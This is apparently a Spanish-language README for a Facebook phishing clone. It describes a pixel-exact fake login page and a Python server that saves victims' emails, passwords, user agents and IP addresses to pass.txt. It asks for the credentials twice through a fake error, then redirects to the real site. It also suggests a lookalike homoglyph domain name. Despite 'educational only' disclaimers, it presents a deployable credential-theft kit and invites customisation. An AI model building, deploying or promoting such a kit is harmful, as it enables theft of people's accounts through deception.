# Clon de Facebook - Captura de Credenciales

Este proyecto crea una réplica exacta de la página de login de Facebook que captura las credenciales de usuario y las guarda en un archivo de texto plano.

## 🚨 ADVERTENCIA IMPORTANTE
Este proyecto es solo para fines educativos y de investigación en seguridad. NO debe usarse para actividades maliciosas o ilegales.

## 📁 Archivos del Proyecto

- `index.html` - Página principal que replica el diseño de Facebook
- `style.css` - Estilos CSS idénticos a Facebook
- `script.js` - JavaScript para modo local (guarda en localStorage)
- `script_server.js` - JavaScript para modo servidor (guarda en pass.txt)
- `server.py` - Servidor Python que maneja el guardado en pass.txt
- `pass.txt` - Archivo donde se guardan las credenciales (se crea automáticamente)

## 🎯 Características

### ✅ Diseño Idéntico a Facebook
- Colores, fuentes y layout exactos
- Responsive design para móviles
- Animaciones y efectos hover

### ✅ Funcionalidad de Captura
- Captura email/usuario y contraseña
- Pide confirmación doble de los datos
- Guarda en archivo de texto plano (pass.txt)
- Después de 2 intentos, redirige al Facebook real

### ✅ Información Capturada
- Fecha y hora del intento
- Número de intento
- Email/usuario ingresado
- Contraseña ingresada
- Email confirmado
- Contraseña confirmada
- User Agent del navegador
- Dirección IP del usuario

## 🚀 Modo de Uso

### Opción 1: Modo Local (Solo Descarga)
1. Abrir `index.html` en un navegador
2. Los datos se guardan en localStorage y se descargan como archivo
3. fаceвοοκ de nombre  en el url
### Opción 2: Modo Servidor (Guarda en pass.txt)
1. Ejecutar el servidor Python:
   ```bash
   python server.py
   
   ```
2. Abrir http://localhost:8000 en el navegador
3. Cambiar en `index.html` la línea:
   ```html
   <script src="script.js"></script>
   ```
   por:
   ```html
   <script src="script_server.js"></script>
   ```

## 📝 Formato del Archivo pass.txt

```
=== FACEBOOK LOGIN DATA ===
Fecha y Hora: 2024-01-15 14:30:25
Intento #: 1
Email/Usuario: usuario@ejemplo.com
Contraseña: contraseña123
Email Confirmado: usuario@ejemplo.com
Contraseña Confirmada: contraseña123
User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
IP: 192.168.1.100
============================
```

## 🔧 Flujo de Funcionamiento

1. **Usuario ingresa credenciales** en la página que parece Facebook
2. **Sistema muestra modal** pidiendo confirmación de datos
3. **Usuario confirma** email y contraseña nuevamente
4. **Datos se guardan** en pass.txt con timestamp e información adicional
5. **Si es el primer intento**: Muestra error y pide intentar de nuevo
6. **Si es el segundo intento**: Redirige al Facebook real

## 🛡️ Consideraciones de Seguridad

- Este proyecto demuestra técnicas de phishing
- Úsalo solo en entornos controlados y con consentimiento
- No distribuyas ni uses para engañar a personas reales
- Es una herramienta educativa para entender vulnerabilidades

## 📱 Compatibilidad

- ✅ Chrome, Firefox, Safari, Edge
- ✅ Dispositivos móviles (responsive)
- ✅ Windows, macOS, Linux

## 🎨 Personalización

Puedes modificar:
- Colores en `style.css`
- Textos en `index.html`
- Lógica de captura en `script.js`
- Formato de guardado en `server.py`

---

**Recuerda**: Este proyecto es solo para educación en ciberseguridad. Úsalo responsablemente.# -F-cebook
